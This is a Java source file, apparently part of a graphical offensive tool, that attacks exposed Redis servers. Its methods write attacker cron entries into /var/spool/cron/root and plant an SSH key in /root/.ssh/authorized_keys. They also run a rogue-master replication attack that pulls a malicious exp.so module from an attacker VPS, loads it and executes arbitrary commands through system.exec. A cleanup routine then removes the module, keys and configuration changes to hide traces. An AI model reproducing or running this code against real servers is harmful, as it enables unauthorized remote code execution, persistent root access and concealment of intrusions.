package Dao;

import Controller.RedisController;
import Entity.ControllersFactory;
import Util.MessageUtil;
import Util.Utils;
import javafx.application.Platform;
import redis.clients.jedis.Jedis;
import redis.clients.jedis.commands.ProtocolCommand;
import redis.clients.jedis.util.SafeEncoder;

import java.sql.SQLException;
import java.util.Arrays;
import java.util.List;


public class RedisDao {
    /**
     * 用此方法获取 RedisController 的日志框
     */
    private RedisController redisController = (RedisController) ControllersFactory.controllers.get(RedisController.class.getSimpleName());

    public static Jedis CONN;
    public static List<String> dir;
    public static String slaveReadOnlyFlag;

    private String ip;
    private int port;
    private String password;
    private int timeout;
    private String OS;
    private String redisVersion;
    private String arch;

    public RedisDao(String ip, String port, String password, String timeout) {
        this.ip = ip;
        this.port = Integer.parseInt(port);
        this.password = password;
        // 毫秒单位
        this.timeout = Integer.parseInt(timeout) * 1000;
    }

    /**
     * 测试是否成功连接上数据库，不需要持久化连接
     *
     * @return
     * @throws SQLException
     */
    public void testConnection() {
        CONN = new Jedis(ip, port, timeout);
        if (password.length() != 0) {
            CONN.auth(password);
        }
        if (CONN != null) {
            CONN.close();
        }
    }

    public void getConnection() throws Exception{
        CONN = new Jedis(ip, port, timeout);
        if (password.length() != 0) {
            CONN.auth(password);
        }
    }

    public void closeConnection() throws Exception {
        if (CONN != null) {
            CONN.close();
        }
    }

    public void getInfo() throws Exception{
        String info = CONN.info();
        dir = CONN.configGet("dir");
        OS = Utils.regularMatch("os:(.*)",info);
        redisVersion = Utils.regularMatch("redis_version:(.*)",info);
        arch = Utils.regularMatch("arch_bits:(.*)",info);

        List<String> dbfilename = CONN.configGet("dbfilename");
        //String orginDir = StringUtils.join(dir, ": ");
        //String orginDbfilename = StringUtils.join(dbfilename, ": ");
        Platform.runLater(() -> {
            //redisController.redisLogTextFArea.appendText(Utils.log(orginDir));
            //redisController.redisLogTextFArea.appendText(Utils.log(orginDbfilename));
            redisController.redisLogTextFArea.appendText(Utils.log("当前系统: " + OS));
            redisController.redisLogTextFArea.appendText(Utils.log("当前系统位数: " + arch));
            redisController.redisLogTextFArea.appendText(Utils.log("当前 Redis 版本: " + redisVersion));
            redisController.redisLogTextFArea.appendText(Utils.log("4.x,5.x 可使用主从同步请注意查看版本信息"));
            redisController.redisOutputTextFArea.setText(info);
        });
    }

    public void redisavedb(String dir, String dbfilename) {
        CONN.configSet("dir", dir);
        CONN.configSet("dbfilename", dbfilename);
        CONN.save();
    }


    public void redisslave(String vpsIp, String vpsPort) {
        try {
            Platform.runLater(() -> {
                redisController.redisLogTextFArea.appendText(Utils.log("Setting master: " + vpsIp + ":" + vpsPort));
            });
            // 开启主从
            CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));

        } catch (Exception e) {
            Platform.runLater(() -> {
                redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
            });
        }
    }


    public void crontab(String cronText) {
        List<String> crondirs = Arrays.asList("/var/spool/cron/", "/var/spool/cron/crontab/", "/var/spool/cron/crontabs/");
        for (String dir : crondirs) {
            try {
                CONN.set("xxcron", "\n\n" + cronText + "\n\n");
                CONN.configSet("dir", dir);
                CONN.configSet("dbfilename", "root");
                CONN.save();
                Platform.runLater(() -> {
                    redisController.redisLogTextFArea.appendText(Utils.log(dir + "root 写入 CRON 计划任务成功！" ));
                });
                break;
            } catch (Exception e) {
                Platform.runLater(() -> {
                    redisController.redisLogTextFArea.appendText(Utils.log("crontab unknown error"));
                    redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
                });
            }
        }
    }

    public void sshkey(String sshRsa) {
        try {
            CONN.set("xxssh", "\n\n" + sshRsa + "\n\n");
            CONN.configSet("dir", "/root/.ssh/");
            CONN.configSet("dbfilename", "authorized_keys");
            CONN.save();
            Platform.runLater(() -> {
                redisController.redisLogTextFArea.appendText(Utils.log("写入 SSH 公钥成功！"));
            });
        } catch (Exception e) {
            Platform.runLater(() -> {
                redisController.redisLogTextFArea.appendText(Utils.log("写入 SSH 公钥失败！"));
                redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
            });
        }

    }

    public void rogue(String vpsip, String vpsport, int timeout) throws InterruptedException {
        redisslave(vpsip, vpsport);

        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("Setting dbfilename..."));
        });
        List<String> slaveReadOnlyList = CONN.configGet("slave-read-only");
        slaveReadOnlyFlag = slaveReadOnlyList.get(1);

        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("成功设置 slave-read-only 为 no！"));
        });
        CONN.configSet("slave-read-only", "no");

        // 配置so文件
        CONN.configSet("dbfilename", "exp.so");

        List<String> dir = CONN.configGet("dir");
        String evalpath = dir.get(1) + "/exp.so";

        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("正在加载模块请稍等..."));
        });
        // 加载恶意so
        Thread.sleep(timeout);
        CONN.moduleLoad(evalpath);
        Thread.sleep(timeout);

        //关闭主从
        CONN.slaveofNoOne();
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("模块加载成功!"));
        });

    }

    public enum SysCommand implements ProtocolCommand {
        EVAL("system.exec");

        private final byte[] raw;

        SysCommand(String alt) {
            raw = SafeEncoder.encode(alt);
        }

        @Override
        public byte[] getRaw() {
            return raw;
        }
    }

    public String eval(String command, String code) {
        String result = "";
        try {
            byte[] bytes = (byte[]) CONN.sendCommand(SysCommand.EVAL, command);
            result = (new String(bytes, code));
        } catch (Exception e) {
            Platform.runLater(() -> {
                MessageUtil.showExceptionMessage(e, e.getMessage());
            });
        }
        return result;
    }

    /**
     * 1. 清理目录和本地文件持久化位置修改
     * 2. 关闭主从
     * 3. 卸载导入so函数
     */
    public void clean() {
        CONN.configSet("dir", dir.get(1));
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("重设 Dir 参数成功！"));
        });

        CONN.configSet("slave-read-only", slaveReadOnlyFlag);
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("重设 slave-read-only 成功！"));
        });
        CONN.configSet("dbfilename", "dump.rdb");
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("重设 dbfilename 参数成功！"));
        });
        CONN.slaveofNoOne();
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("重设 slaveof 成功"));
        });
        eval("rm -f " + dir.get(1) + "/exp.so", "UTF-8");
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("删除 exp 提权模块成功！"));
        });
        CONN.moduleUnload("system");
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("卸载函数成功过！"));
        });
        CONN.del("xxssh");
        CONN.del("xxcron");
        Platform.runLater(() -> {
            redisController.redisLogTextFArea.appendText(Utils.log("删除 Key 成功！"));
        });
    }

}
